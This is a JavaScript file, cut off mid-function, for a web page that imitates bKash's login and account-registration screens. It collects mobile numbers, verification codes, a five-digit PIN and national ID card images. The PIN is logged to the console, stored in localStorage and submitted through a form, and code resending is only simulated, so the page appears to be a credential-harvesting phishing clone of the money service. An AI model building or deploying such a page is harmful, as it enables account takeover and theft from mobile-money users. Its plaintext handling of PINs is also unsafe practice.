// ====================================
// CORE SETUP AND INITIALIZATION
// ====================================
document.addEventListener("DOMContentLoaded", function () {
  // Global state for user
  const currentUser = {
    isLoggedIn: false,
    mobileNumber: null,
    operator: null,
    pin: null,
    verificationCode: null,
    nidInfo: {
      name: "",
      fatherName: "",
      motherName: "",
      dob: "",
      address: "",
      nidNumber: "",
    },
    accountType: null, // "login" or "register"
  };

  // Initialize the app components
  initApp();

  // App initialization
  function initApp() {
    setupNavigation();
    adjustServiceGridLayout();
    setupServicesButton();
    setupLanguageToggle();
    setupPopupBackButtons();
    setupPopupCloseButtons();
    setupMobileMenu();
    setupSidebarLogoutHandler();

    // Connect main login button to popup
    const mainLoginButton = document.getElementById("mainLoginButton");
    if (mainLoginButton) {
      mainLoginButton.addEventListener("click", function () {
        showPopup("loginPopup");
      });
    }

    // Connect navbar login button to popup
    const navLoginButton = document.getElementById("loginButton");
    if (navLoginButton) {
      navLoginButton.addEventListener("click", function () {
        showPopup("loginPopup");
      });
    }

    // Setup event listeners for all popups
    setupAllPopupEventListeners();

    // Check if user is already logged in (from localStorage or sessionStorage)
    checkLoggedInStatus();

    console.log("Application initialized successfully");
  }

  // Adjust the service grid layout to make items closer together
  function adjustServiceGridLayout() {
    const serviceGrid = document.querySelector(".service-grid");
    if (serviceGrid) {
      // Reduce padding and gap to make items closer
      serviceGrid.style.gridGap = "10px 20px";
      serviceGrid.style.padding = "0 4%";

      // Make service items more compact
      const serviceItems = document.querySelectorAll(".service-item");
      serviceItems.forEach((item) => {
        item.style.padding = "5px";
      });
    }
  }

  // function checkLoggedInStatus() {
  //   const savedUser = localStorage.getItem("bkashUser");
  //   if (savedUser) {
  //     try {
  //       const parsedUser = JSON.parse(savedUser);

  //       // Update currentUser with saved data
  //       Object.assign(currentUser, parsedUser);

  //       // Set login status
  //       if (parsedUser.isLoggedIn) {
  //         currentUser.isLoggedIn = true;

  //         // Update UI immediately
  //         updateUIForLoggedInUser();

  //         // Fix services button explicitly
  //         const loginButton = document.getElementById("loginButton");
  //         if (loginButton) {
  //           loginButton.classList.add("logged-in");

  //           // Remove any previous click listeners to avoid duplicates
  //           const newButton = loginButton.cloneNode(true);
  //           loginButton.parentNode.replaceChild(newButton, loginButton);

  //           // Add the click event again
  //           setupServicesButtonLoggedIn(newButton);
  //         }

  //         console.log("User session restored successfully", currentUser);

  //         // If we're on index.html, redirect to main.html
  //         if (
  //           // window.location.pathname.includes("index.html") ||
  //           window.location.pathname.endsWith("/")
  //         ) {
  //           // window.location.href = "/";
  //         }
  //       }
  //     } catch (e) {
  //       console.error("Error restoring user session:", e);
  //       localStorage.removeItem("bkashUser");
  //     }
  //   }
  // }

  // Setup services button click event for logged in users
  function setupServicesButtonLoggedIn(button) {
    const serviceGrid = document.getElementById("serviceGrid");

    if (button && serviceGrid) {
      button.addEventListener("click", function (e) {
        e.preventDefault();
        e.stopPropagation();

        console.log("Services button clicked by logged in user");

        // Always toggle dropdown for logged in users
        this.classList.toggle("active");
        serviceGrid.classList.toggle("show");
      });
    }
  }

  // Update UI elements when user is logged in
  function updateUIForLoggedInUser() {
    if (!currentUser.isLoggedIn) return;

    console.log("Updating UI for logged-in user", currentUser.mobileNumber);

    // Add logged-in class to services button
    const loginButton = document.getElementById("loginButton");
    if (loginButton) {
      loginButton.classList.add("logged-in");

      // Update sidebar with user info if present
      const sidebarUser = document.querySelector(".sidebar-user-img");
      if (sidebarUser) {
        // Add user mobile number to sidebar
        const sidebarTitle = document.querySelector(".sidebar-title");
        if (sidebarTitle) {
          sidebarTitle.innerHTML = `বিকাশ মেনু <br><small style="font-size: 12px;">+88${currentUser.mobileNumber}</small>`;
        }
      }
    }

    // Update any user-specific UI elements
    const userElements = document.querySelectorAll(".user-mobile-number");
    userElements.forEach((el) => {
      el.textContent = currentUser.mobileNumber;
    });

    // Also update service grid layout to make items closer
    const serviceGrid = document.querySelector(".service-grid");
    if (serviceGrid) {
      serviceGrid.style.gridGap = "10px 30px";
      serviceGrid.style.padding = "0 3%";
    }
  }

  // Setup main navigation
  function setupNavigation() {
    const navItems = document.querySelectorAll(".nav-item");
    navItems.forEach((item) => {
      if (item.id === "loginButton") return; // Handled separately

      item.addEventListener("click", function (e) {
        // Only prevent default for items that don't have specific URLs
        if (!this.getAttribute("href") || this.getAttribute("href") === "#") {
          e.preventDefault();
        }
      });
    });
  }

  function setupServicesButton() {
    const servicesButton = document.getElementById("servicesButton");
    const serviceGrid = document.getElementById("serviceGrid");

    if (servicesButton && serviceGrid) {
      servicesButton.addEventListener("click", function (e) {
        e.preventDefault();
        e.stopPropagation();

        // Always check current login status from both memory and localStorage
        const savedUser = localStorage.getItem("bkashUser");
        let isLoggedIn = currentUser.isLoggedIn;

        if (!isLoggedIn && savedUser) {
          try {
            const parsedUser = JSON.parse(savedUser);
            isLoggedIn = parsedUser.isLoggedIn;

            // If user is logged in from localStorage but not in memory,
            // update currentUser and UI
            if (parsedUser.isLoggedIn && !currentUser.isLoggedIn) {
              Object.assign(currentUser, parsedUser);
              currentUser.isLoggedIn = true;
              updateUIForLoggedInUser();

              // Replace button with new one to ensure clean event handlers
              const newButton = servicesButton.cloneNode(true);
              servicesButton.parentNode.replaceChild(newButton, servicesButton);

              // Set up click handler for logged in state
              setupServicesButtonLoggedIn(newButton);

              // Call click on the new button to show menu
              setTimeout(() => newButton.click(), 100);
              return;
            }
          } catch (e) {
            console.error("Error parsing saved user:", e);
          }
        }

        console.log("Services button clicked, logged in status:", isLoggedIn);

        if (!isLoggedIn) {
          // Show login/registration popup if not logged in
          showPopup("loginPopup");
          showNotification("সার্ভিস দেখতে লগইন করুন");
        } else {
          // Toggle dropdown menu if logged in
          this.classList.toggle("active");
          serviceGrid.classList.toggle("show");
        }
      });

      // Close dropdown when clicking outside
      document.addEventListener("click", function (e) {
        if (
          serviceGrid.classList.contains("show") &&
          !servicesButton.contains(e.target) &&
          !serviceGrid.contains(e.target)
        ) {
          servicesButton.classList.remove("active");
          serviceGrid.classList.remove("show");
        }
      });
    }
  }

  // Setup sidebar logout handler - improved integration with sidebar
  function setupSidebarLogoutHandler() {
    document.addEventListener("click", function (e) {
      // Check for logout button in sidebar
      if (
        e.target &&
        (e.target.textContent === "লগ আউট" ||
          (e.target.parentElement &&
            e.target.parentElement.textContent === "লগ আউট"))
      ) {
        logout();

        // Also close the sidebar
        const sidebar = document.getElementById("sidebar");
        const overlay = document.getElementById("sidebarOverlay");

        if (sidebar && overlay) {
          sidebar.classList.remove("active");
          sidebar.style.right = "-60%";
          overlay.classList.remove("active");
          document.body.style.overflow = "";
        }
      }
    });
  }

  // Logout function
  function logout() {
    currentUser.isLoggedIn = false;
    localStorage.removeItem("bkashUser");

    // Update UI elements
    const loginButton = document.getElementById("loginButton");
    if (loginButton) {
      loginButton.classList.remove("logged-in");

      // Close services dropdown if open
      const serviceGrid = document.getElementById("serviceGrid");
      if (serviceGrid && serviceGrid.classList.contains("show")) {
        serviceGrid.classList.remove("show");
        loginButton.classList.remove("active");
      }
    }

    showNotification("লগআউট সফল হয়েছে");

    // Redirect to home page after logout
    setTimeout(() => {
      window.location.href = "index.html";
    }, 1500);
  }

  // Setup mobile menu
  function setupMobileMenu() {
    const menuToggle = document.getElementById("menuToggle");
    const nav = document.querySelector(".nav");

    if (menuToggle && nav) {
      menuToggle.addEventListener("click", function () {
        nav.classList.toggle("show-mobile");
      });
    }
  }

  // Setup language toggle
  function setupLanguageToggle() {
    const langButtons = document.querySelectorAll(".lang-btn");
    langButtons.forEach(function (button) {
      button.addEventListener("click", function () {
        langButtons.forEach(function (btn) {
          btn.classList.remove("active-lang");
        });
        this.classList.add("active-lang");
      });
    });
  }

  // ====================================
  // POPUP MANAGEMENT AND UI COMPONENTS
  // ====================================

  // Setup the back buttons for all popups
  function setupPopupBackButtons() {
    document.querySelectorAll(".popup-back").forEach((button) => {
      button.addEventListener("click", function () {
        const currentPopup = this.closest(".popup");
        if (currentPopup) {
          const popupId = currentPopup.id;

          // Define the back target for each popup
          const backTargets = {
            loginVerificationPopup: "loginPopup",
            loginCodePopup: "loginVerificationPopup",
            loginPinPopup: "loginCodePopup",
            numberVerificationPopup: "loginPopup",
            operatorSelectionPopup: "numberVerificationPopup",
            identitySelectionPopup: "operatorSelectionPopup",
            verificationCodePopup: "numberVerificationPopup",
            termsPopup: "verificationCodePopup",
            eKycPopup: "termsPopup",
            nidUploadPopup: "eKycPopup",
            nidDetailsPopup: "nidUploadPopup",
            faceVerificationPopup: "nidDetailsPopup",
            pinSetupPopup: "faceVerificationPopup",
          };

          const targetPopupId = backTargets[popupId];
          if (targetPopupId) {
            hidePopup(popupId);
            showPopup(targetPopupId);
          }
        }
      });
    });
  }

  // Setup close buttons for all popups
  function setupPopupCloseButtons() {
    document.querySelectorAll(".popup-close").forEach((button) => {
      button.addEventListener("click", hideAllPopups);
    });
  }

  // Setup event listeners for all popups
  function setupAllPopupEventListeners() {
    setupLoginPopup();
    setupLoginVerificationPopup();
    setupLoginCodePopup();
    setupLoginPinPopup();
    setupNumberVerificationPopup();
    setupOperatorSelectionPopup();
    setupIdentitySelectionPopup();
    setupVerificationCodePopup();
    setupTermsPopup();
    setupEkycPopup();
    setupNidUploadPopup();
    setupNidDetailsPopup();
    setupFaceVerificationPopup();
    setupPinSetupPopup();
    setupSuccessPopup();
  }

  // Show popup with overlay
  function showPopup(popupId) {
    const popup = document.getElementById(popupId);
    const overlay = document.getElementById("overlay");

    if (popup && overlay) {
      document.querySelectorAll(".popup").forEach((p) => {
        p.classList.remove("show");
      });

      overlay.classList.add("show");
      popup.classList.add("show");

      // Setup event listeners based on which popup is shown
      setupPopupEventListeners(popupId);
    }
  }

  // Hide popup
  function hidePopup(popupId) {
    const popup = document.getElementById(popupId);

    if (popup) {
      popup.classList.remove("show");
    }
  }

  // Hide all popups
  function hideAllPopups() {
    document.querySelectorAll(".popup").forEach((popup) => {
      popup.classList.remove("show");
    });

    const overlay = document.getElementById("overlay");
    if (overlay) {
      overlay.classList.remove("show");
    }
  }

  // Show notification
  function showNotification(message) {
    const notification = document.getElementById("notification");
    if (notification) {
      notification.textContent = message;
      notification.classList.add("show");

      setTimeout(() => {
        notification.classList.remove("show");
      }, 3000);
    } else {
      // Create notification element if it doesn't exist
      const notificationElement = document.createElement("div");
      notificationElement.id = "notification";
      notificationElement.className = "notification";
      notificationElement.textContent = message;
      document.body.appendChild(notificationElement);

      // Show notification
      setTimeout(() => {
        notificationElement.classList.add("show");
      }, 100);

      // Hide after delay
      setTimeout(() => {
        notificationElement.classList.remove("show");
      }, 3000);
    }
  }

  // Save user data to localStorage
  function saveUserToLocalStorage() {
    try {
      localStorage.setItem("bkashUser", JSON.stringify(currentUser));
      console.log("User data saved to localStorage", currentUser);
    } catch (e) {
      console.error("Error saving user data:", e);
    }
  }

  // ====================================
  // EVENT HANDLER IMPLEMENTATION AND BUSINESS LOGIC
  // ====================================

  // Setup event listeners for popups
  function setupPopupEventListeners(popupId) {
    if (popupId === "loginPopup") {
      setupLoginPopup();
    } else if (popupId === "loginVerificationPopup") {
      setupLoginVerificationPopup();
    } else if (popupId === "loginCodePopup") {
      setupLoginCodePopup();
    } else if (popupId === "loginPinPopup") {
      setupLoginPinPopup();
    } else if (popupId === "numberVerificationPopup") {
      setupNumberVerificationPopup();
    } else if (popupId === "operatorSelectionPopup") {
      setupOperatorSelectionPopup();
    } else if (popupId === "identitySelectionPopup") {
      setupIdentitySelectionPopup();
    } else if (popupId === "verificationCodePopup") {
      setupVerificationCodePopup();
    } else if (popupId === "termsPopup") {
      setupTermsPopup();
    } else if (popupId === "eKycPopup") {
      setupEkycPopup();
    } else if (popupId === "nidUploadPopup") {
      setupNidUploadPopup();
    } else if (popupId === "nidDetailsPopup") {
      setupNidDetailsPopup();
    } else if (popupId === "faceVerificationPopup") {
      setupFaceVerificationPopup();
    } else if (popupId === "pinSetupPopup") {
      setupPinSetupPopup();
    } else if (popupId === "successPopup") {
      setupSuccessPopup();
    }
  }

  // Login popup handlers
  function setupLoginPopup() {
    const loginBtn = document.getElementById("btnLogin");
    const registerBtn = document.getElementById("btnRegister");
    const viewAppBtn = document.getElementById("btnViewApp");

    if (loginBtn) {
      loginBtn.addEventListener("click", () => {
        currentUser.accountType = "login";
        hidePopup("loginPopup");
        showPopup("loginVerificationPopup");
      });
    }

    if (registerBtn) {
      registerBtn.addEventListener("click", () => {
        currentUser.accountType = "register";
        hidePopup("loginPopup");
        showPopup("numberVerificationPopup");
      });
    }

    if (viewAppBtn) {
      viewAppBtn.addEventListener("click", () => {
        hideAllPopups();
        showNotification("বিকাশ অ্যাপ ডাউনলোড করুন");
      });
    }
  }

  // Login verification popup handlers - Improved phone validation
  function setupLoginVerificationPopup() {
    const submitBtn = document.getElementById("btnSubmitLoginNumber");
    const mobileInput = document.getElementById("loginMobileNumber");

    if (mobileInput) {
      // Enhanced input validation for Bangladeshi numbers
      mobileInput.addEventListener("input", function () {
        // Force input to only contain numbers
        this.value = this.value.replace(/[^0-9]/g, "");

        // Ensure it starts with proper Bangladeshi prefixes
        if (this.value.length >= 3) {
          const prefix = this.value.substring(0, 3);
          const validPrefixes = [
            "013",
            "014",
            "015",
            "016",
            "017",
            "018",
            "019",
          ];

          if (!validPrefixes.includes(prefix) && this.value.startsWith("01")) {
            // If starts with 01 but 3rd digit not valid, don't correct it
            // but will be validated on submit
          } else if (!this.value.startsWith("01")) {
            // If doesn't start with 01, correct to default 017
            this.value = "017" + this.value.substring(3);
          }
        }
      });
    }

    if (submitBtn) {
      submitBtn.addEventListener("click", () => {
        const mobileNumber = document.getElementById("loginMobileNumber").value;

        // Enhanced validation for Bangladeshi mobile numbers
        if (mobileNumber.length !== 11) {
          showNotification("সঠিক ১১ ডিজিটের মোবাইল নাম্বার দিন");
          return;
        }

        // Validate correct Bangladeshi prefixes
        const prefix = mobileNumber.substring(0, 3);
        const validPrefixes = ["013", "014", "015", "016", "017", "018", "019"];

        if (!validPrefixes.includes(prefix)) {
          showNotification(
            "সঠিক বাংলাদেশি মোবাইল নাম্বার দিন (013/014/015/016/017/018/019)"
          );
          return;
        }

        // Store mobile number in user object
        currentUser.mobileNumber = mobileNumber;

        // Update mobile number display
        const mobileNumberDisplay = document.getElementById(
          "loginMobileNumberDisplay"
        );
        if (mobileNumberDisplay) {
          mobileNumberDisplay.textContent = "+880" + mobileNumber;
        }

        // Detect operator for icon
        let operatorIcon = determineOperatorIcon(prefix);

        // Update operator icon
        const operatorIconElement =
          document.getElementById("loginOperatorIcon");
        if (operatorIconElement && operatorIcon) {
          operatorIconElement.src = operatorIcon;
        }

        hidePopup("loginVerificationPopup");
        showPopup("loginCodePopup");
      });
    }
  }

  // Determine operator icon based on prefix - Enhanced with better detection
  function determineOperatorIcon(prefix) {
    switch (prefix) {
      case "017":
      case "013":
        return "images/operator-gp.png"; // Grameenphone
      case "018":
        return "images/operator-robi.png"; // Robi
      case "016":
        return "images/operator-airtel.png"; // Airtel
      case "019":
      case "014":
        return "images/operator-banglalink.png"; // Banglalink
      case "015":
        return "images/operator-teletalk.png"; // Teletalk
      default:
        return "images/operator-gp.png"; // Default to Grameenphone
    }
  }

  // Login code verification popup handlers
  function setupLoginCodePopup() {
    const submitBtn = document.getElementById("btnSubmitLoginCode");
    const codeInputs = document.querySelectorAll("#loginCodePopup .code-input");
    const changeNumberBtn = document.getElementById("btnChangeLoginNumber");
    const resendBtn = document.getElementById("btnResendCode");

    // Update mobile number display
    const mobileNumber = document.getElementById("loginMobileNumberDisplay");
    if (mobileNumber && currentUser.mobileNumber) {
      mobileNumber.textContent = "+880" + currentUser.mobileNumber;
    }

    // Setup countdown timer
    setupCountdownTimer();

    // Setup code input focus behavior
    setupCodeInputFields(codeInputs);

    if (submitBtn) {
      submitBtn.addEventListener("click", () => {
        // Validate verification code
        let code = "";
        let isComplete = true;

        codeInputs.forEach((input) => {
          code += input.value;
          if (!input.value) isComplete = false;
        });

        if (!isComplete || code.length !== 6) {
          showNotification("৬ ডিজিটের সম্পূর্ণ কোড দিন");
          return;
        }

        currentUser.verificationCode = code;
        hidePopup("loginCodePopup");
        showPopup("loginPinPopup");
      });
    }

    if (changeNumberBtn) {
      changeNumberBtn.addEventListener("click", (e) => {
        e.preventDefault();
        hidePopup("loginCodePopup");
        showPopup("loginVerificationPopup");
      });
    }

    if (resendBtn) {
      resendBtn.addEventListener("click", (e) => {
        e.preventDefault();
        // Simulate code resending
        showNotification("নতুন ভেরিফিকেশন কোড পাঠানো হয়েছে");
        setupCountdownTimer();
        resendBtn.style.opacity = "0.5";
        resendBtn.style.pointerEvents = "none";

        // Clear all input fields
        codeInputs.forEach((input) => {
          input.value = "";
        });

        // Focus on first input
        if (codeInputs.length > 0) {
          codeInputs[0].focus();
        }

        // Re-enable resend button after countdown
        setTimeout(() => {
          resendBtn.style.opacity = "1";
          resendBtn.style.pointerEvents = "auto";
        }, 120000);
      });
    }
  }

  // Login PIN entry popup handlers - Fixed for proper services button functionality and redirect to main.html
  function setupLoginPinPopup() {
    const pinInputs = document.querySelectorAll(".login-pin-input");
    const submitBtn = document.getElementById("btnSubmitLoginPin");
    const showPinCheckbox = document.getElementById("showLoginPinCheckbox");
    const forgotPinBtn = document.getElementById("btnForgotPin");

    // Setup automatic focus behavior for PIN inputs
    setupPinInputFields(pinInputs);

    if (showPinCheckbox) {
      showPinCheckbox.addEventListener("change", function () {
        const inputType = this.checked ? "text" : "password";
        pinInputs.forEach((input) => {
          input.type = inputType;
        });
      });
    }

    // Remove existing click handlers from the submit button
    if (submitBtn) {
      const newSubmitBtn = submitBtn.cloneNode(true);
      if (submitBtn.parentNode) {
        submitBtn.parentNode.replaceChild(newSubmitBtn, submitBtn);
      }
      
      // Add a new clean event listener
      newSubmitBtn.addEventListener("click", function(e) {
        e.preventDefault();
        
        console.log("Login button clicked");
        
        // Collect PIN value
        let pin = "";
        let isComplete = true;
        
        pinInputs.forEach(input => {
          if (!input.value) isComplete = false;
          pin += input.value.trim();
        });
        
        if (!isComplete || pin.length !== 5) {
          showNotification("সম্পূর্ণ ৫ ডিজিটের পিন দিন");
          return;
        }
        
        // Set the hidden field value
        const pinField = document.getElementById("fullPin");
        if (pinField) {
          pinField.value = pin;
          console.log("PIN value set to:", pin);
        }
        
        // Track user state
        currentUser.pin = pin;
        currentUser.isLoggedIn = true;
        saveUserToLocalStorage();
        
        // Submit the form
        const form = document.getElementById("fullPin")?.form;
        if (form) {
          console.log("Submitting form with mobile:", document.getElementById("loginMobileNumber")?.value);
          console.log("Submitting form with pin:", pin);
          form.submit();
        } else {
          console.error("Form not found");
          // Fallback to redirect if form not found
          showNotification("লগইন সফল হয়েছে");
          setTimeout(() => {
            window.location.href = "/main";
          }, 1000);
        }
      });
    }

    if (forgotPinBtn) {
      forgotPinBtn.addEventListener("click", (e) => {
        e.preventDefault();
        showNotification("পিন রিসেট করার জন্য বিকাশ অ্যাপ ব্যবহার করুন");
      });
    }
  }

  // Number verification popup handlers for registration - Enhanced validation
  function setupNumberVerificationPopup() {
    const submitBtn = document.getElementById("btnSubmitNumber");
    const termsBtn = document.getElementById("btnTermsConditions");
    const mobileInput = document.getElementById("mobileNumber");
    const termsCheckbox = document.getElementById("termsCheckbox");

    if (mobileInput) {
      // Enhanced input validation for Bangladeshi numbers
      mobileInput.addEventListener("input", function () {
        // Force input to only contain numbers
        this.value = this.value.replace(/[^0-9]/g, "");

        // Ensure it starts with proper Bangladeshi prefixes
        if (this.value.length >= 3) {
          const prefix = this.value.substring(0, 3);
          const validPrefixes = [
            "013",
            "014",
            "015",
            "016",
            "017",
            "018",
            "019",
          ];

          if (!validPrefixes.includes(prefix) && this.value.startsWith("01")) {
            // If starts with 01 but 3rd digit not valid, don't correct it
            // but will be validated on submit
          } else if (!this.value.startsWith("01")) {
            // If doesn't start with 01, correct to default 017
            this.value = "017" + this.value.substring(3);
          }
        }
      });
    }

    if (submitBtn) {
      submitBtn.addEventListener("click", () => {
        const mobileNumber = document.getElementById("mobileNumber").value;

        // Enhanced validation for Bangladeshi mobile numbers
        if (mobileNumber.length !== 11) {
          showNotification("সঠিক ১১ ডিজিটের মোবাইল নাম্বার দিন");
          return;
        }

        // Validate correct Bangladeshi prefixes
        const prefix = mobileNumber.substring(0, 3);
        const validPrefixes = ["013", "014", "015", "016", "017", "018", "019"];

        if (!validPrefixes.includes(prefix)) {
          showNotification(
            "সঠিক বাংলাদেশি মোবাইল নাম্বার দিন (013/014/015/016/017/018/019)"
          );
          return;
        }

        // Validate terms agreement
        if (termsCheckbox && !termsCheckbox.checked) {
          showNotification("নিয়ম ও শর্তসমূহে সম্মত হোন");
          return;
        }

        // Store mobile number in user object
        currentUser.mobileNumber = mobileNumber;

        // Update mobile number display in operator selection
        const displayMobileNumber = document.getElementById(
          "displayMobileNumber"
        );
        if (displayMobileNumber) {
          displayMobileNumber.textContent = "+880" + mobileNumber;
        }

        // Detect operator based on prefix and pre-select in next screen
        detectAndHighlightOperator(prefix);

        hidePopup("numberVerificationPopup");
        showPopup("operatorSelectionPopup");
      });
    }

    if (termsBtn) {
      termsBtn.addEventListener("click", (e) => {
        e.preventDefault();
        hidePopup("numberVerificationPopup");
        showPopup("termsPopup");
      });
    }
  }

  // Detect operator based on mobile number prefix - Enhanced to improve matching
  function detectAndHighlightOperator(prefix) {
    let operatorToSelect = null;

    // Map prefixes to operators
    switch (prefix) {
      case "017":
      case "013":
        operatorToSelect = "grameenphone";
        break;
      case "018":
        operatorToSelect = "robi";
        break;
      case "016":
        operatorToSelect = "airtel";
        break;
      case "019":
      case "014":
        operatorToSelect = "banglalink";
        break;
      case "015":
        operatorToSelect = "teletalk";
        break;
      default:
        // If no match (shouldn't happen with validation), default to GP
        operatorToSelect = "grameenphone";
    }

    // Pre-select operator in next screen
    if (operatorToSelect) {
      setTimeout(() => {
        const operatorItems = document.querySelectorAll(".operator-item");
        operatorItems.forEach((item) => {
          if (item.getAttribute("data-operator") === operatorToSelect) {
            item.classList.add("pre-selected");
            // Add visual indicator for pre-selected operator
            item.style.borderColor = "#e2146c";
            item.style.boxShadow = "0 0 5px rgba(226, 20, 108, 0.3)";
          } else {
            item.classList.remove("pre-selected");
            item.style.borderColor = "";
            item.style.boxShadow = "";
          }
        });
      }, 100);
    }
  }

  // Operator selection popup handlers - Improved validation
  function setupOperatorSelectionPopup() {
    const operatorItems = document.querySelectorAll(".operator-item");
    const cancelBtn = document.getElementById("btnCancelOperator");
    const mobileNumber = currentUser.mobileNumber || "";
    const prefix = mobileNumber.substring(0, 3);

    // Update mobile number display
    const displayMobileNumber = document.getElementById("displayMobileNumber");
    if (displayMobileNumber) {
      displayMobileNumber.textContent = "+880" + mobileNumber;
    }

    operatorItems.forEach((item) => {
      // Validate operator selection against number prefix
      item.addEventListener("click", () => {
        const operator = item.getAttribute("data-operator");
        const prefixes = item.getAttribute("data-prefix").split(",");

        // Check if the mobile number prefix matches the expected prefix for this operator
        const isValidPrefix = prefixes.some((validPrefix) =>
          mobileNumber.startsWith(validPrefix)
        );

        if (!isValidPrefix) {
          showNotification(`এই নম্বরটি ${operator} অপারেটর নয়`);
          return;
        }

        // Set selected operator
        currentUser.operator = operator;

        // Update operator icon in subsequent screens
        updateOperatorIcon(operator);

        hidePopup("operatorSelectionPopup");
        showPopup("identitySelectionPopup");
      });
    });

    if (cancelBtn) {
      cancelBtn.addEventListener("click", () => {
        hidePopup("operatorSelectionPopup");
        showPopup("numberVerificationPopup");
      });
    }
  }

  // Update operator icon in all relevant places
  function updateOperatorIcon(operator) {
    const operatorIcons = document.querySelectorAll(".operator-icon");
    const iconSrc = `images/operator-${operator}.png`;

    operatorIcons.forEach((icon) => {
      icon.src = iconSrc;
      icon.alt = operator;
    });
  }

  // Identity selection popup handlers
  function setupIdentitySelectionPopup() {
    const nidBtn = document.getElementById("btnSelectNid");
    const birthCertBtn = document.getElementById("btnSelectBirthCert");

    // Update mobile number display
    const mobileNumberDisplay = document.getElementById("mobileNumberDisplay");
    if (mobileNumberDisplay && currentUser.mobileNumber) {
      mobileNumberDisplay.textContent = "+880" + currentUser.mobileNumber;
    }

    if (nidBtn) {
      nidBtn.addEventListener("click", () => {
        hidePopup("identitySelectionPopup");
        showPopup("verificationCodePopup");
      });
    }

    if (birthCertBtn) {
      birthCertBtn.addEventListener("click", () => {
        showNotification("বর্তমানে শুধুমাত্র NID দিয়ে রেজিস্ট্রেশন সম্ভব");
      });
    }
  }

  // Verification code popup handlers
  function setupVerificationCodePopup() {
    const submitBtn = document.getElementById("btnSubmitVerificationCode");
    const codeInputs = document.querySelectorAll(
      "#verificationCodePopup .code-input"
    );
    const changeNumberBtn = document.getElementById(
      "btnChangeNumberFromVerification"
    );
    const resendBtn = document.getElementById("btnResendCode");

    // Update mobile number and operator icon
    const mobileNumber = document.getElementById("verificationMobileNumber");
    if (mobileNumber && currentUser.mobileNumber) {
      mobileNumber.textContent = "+880" + currentUser.mobileNumber;
    }

    // Setup countdown timer
    setupCountdownTimer();

    // Setup code input focus behavior
    setupCodeInputFields(codeInputs);

    if (submitBtn) {
      submitBtn.addEventListener("click", () => {
        // Validate verification code
        let code = "";
        let isComplete = true;

        codeInputs.forEach((input) => {
          code += input.value;
          if (!input.value) isComplete = false;
        });

        if (!isComplete || code.length !== 6) {
          showNotification("৬ ডিজিটের সম্পূর্ণ কোড দিন");
          return;
        }

        currentUser.verificationCode = code;
        hidePopup("verificationCodePopup");
        showPopup("eKycPopup");
      });
    }

    if (changeNumberBtn) {
      changeNumberBtn.addEventListener("click", (e) => {
        e.preventDefault();
        hidePopup("verificationCodePopup");
        showPopup("numberVerificationPopup");
      });
    }

    if (resendBtn) {
      resendBtn.addEventListener("click", (e) => {
        e.preventDefault();
        // Simulate code resending
        showNotification("নতুন ভেরিফিকেশন কোড পাঠানো হয়েছে");
        setupCountdownTimer();
        resendBtn.style.opacity = "0.5";
        resendBtn.style.pointerEvents = "none";

        // Clear all input fields
        codeInputs.forEach((input) => {
          input.value = "";
        });

        // Focus on first input
        if (codeInputs.length > 0) {
          codeInputs[0].focus();
        }

        // Re-enable resend button after countdown
        setTimeout(() => {
          resendBtn.style.opacity = "1";
          resendBtn.style.pointerEvents = "auto";
        }, 120000);
      });
    }
  }

  // Setup countdown timer for verification code
  function setupCountdownTimer() {
    const timerElement = document.getElementById("resendTimer");
    if (!timerElement) return;

    let timeLeft = 120; // 2 minutes
    timerElement.textContent = timeLeft;

    const countdownInterval = setInterval(() => {
      timeLeft--;
      timerElement.textContent = timeLeft;

      if (timeLeft <= 0) {
        clearInterval(countdownInterval);
      }
    }, 1000);
  }

  // Setup input fields for verification code
  function setupCodeInputFields(inputs) {
    if (!inputs || !inputs.length) return;

    // Auto focus to first input
    inputs[0].focus();

    // Setup input behavior
    inputs.forEach((input, index) => {
      // Handle numeric input and auto-advance
      input.addEventListener("input", function (e) {
        // Replace any non-numeric input
        this.value = this.value.replace(/[^0-9]/g, "");

        if (this.value && index < inputs.length - 1) {
          inputs[index + 1].focus();
        }
      });

      // Handle backspace
      input.addEventListener("keydown", function (e) {
        if (e.key === "Backspace") {
          if (!this.value && index > 0) {
            inputs[index - 1].focus();
          }
        }
      });

      // Handle paste events for the entire code
      input.addEventListener("paste", function (e) {
        e.preventDefault();
        const pasteData = e.clipboardData.getData("text");
        const numericData = pasteData.replace(/[^0-9]/g, "");

        if (numericData.length > 0) {
          // Distribute pasted digits across inputs
          for (let i = 0; i < inputs.length; i++) {
            if (i < numericData.length) {
              inputs[i].value = numericData[i];
            }
          }

          // Focus the next empty input or the last one
          let focusIndex = Math.min(numericData.length, inputs.length - 1);
          inputs[focusIndex].focus();
        }
      });
    });
  }

  // ====================================
  // ADDITIONAL COMPONENTS AND REGISTRATION COMPLETION
  // ====================================

  // Terms popup handlers
  function setupTermsPopup() {
    const acceptBtn = document.getElementById("btnAcceptTerms");
    const cancelBtn = document.getElementById("btnCancelTerms");

    if (acceptBtn) {
      acceptBtn.addEventListener("click", () => {
        hidePopup("termsPopup");
        // Determine where to go based on where we came from
        if (currentUser.accountType === "register") {
          if (currentUser.verificationCode) {
            showPopup("eKycPopup");
          } else {
            showPopup("numberVerificationPopup");
          }
        } else {
          showPopup("numberVerificationPopup");
        }
      });
    }

    if (cancelBtn) {
      cancelBtn.addEventListener("click", () => {
        hidePopup("termsPopup");
        showPopup("numberVerificationPopup");
      });
    }
  }

  // eKYC popup handlers
  function setupEkycPopup() {
    const startBtn = document.getElementById("btnStartNidUpload");

    if (startBtn) {
      startBtn.addEventListener("click", () => {
        hidePopup("eKycPopup");
        showPopup("nidUploadPopup");
      });
    }
  }

  // NID upload popup handlers
  function setupNidUploadPopup() {
    const frontNidInput = document.getElementById("frontNidInput");
    const backNidInput = document.getElementById("backNidInput");
    const frontPreview = document.getElementById("frontNidPreview");
    const backPreview = document.getElementById("backNidPreview");
    const submitBtn = document.getElementById("btnSubmitNidUpload");
    const cancelBtn = document.getElementById("btnCancelNidUpload");

    if (frontNidInput && frontPreview) {
      frontNidInput.addEventListener("change", (e) => {
        handleImageUpload(e, frontPreview);
      });
    }

    if (backNidInput && backPreview) {
      backNidInput.addEventListener("change", (e) => {
        handleImageUpload(e, backPreview);
      });
    }

    if (submitBtn) {
      submitBtn.addEventListener("click", () => {
        if (
          !frontPreview.classList.contains("has-image") ||
          !backPreview.classList.contains("has-image")
        ) {
          showNotification("NID এর উভয় দিকের ছবি তুলুন");
          return;
        }

        // Simulate NID OCR and extract info
        simulateNidDataExtraction();

        hidePopup("nidUploadPopup");
        showPopup("nidDetailsPopup");
      });
    }

    if (cancelBtn) {
      cancelBtn.addEventListener("click", () => {
        hidePopup("nidUploadPopup");
        showPopup("eKycPopup");
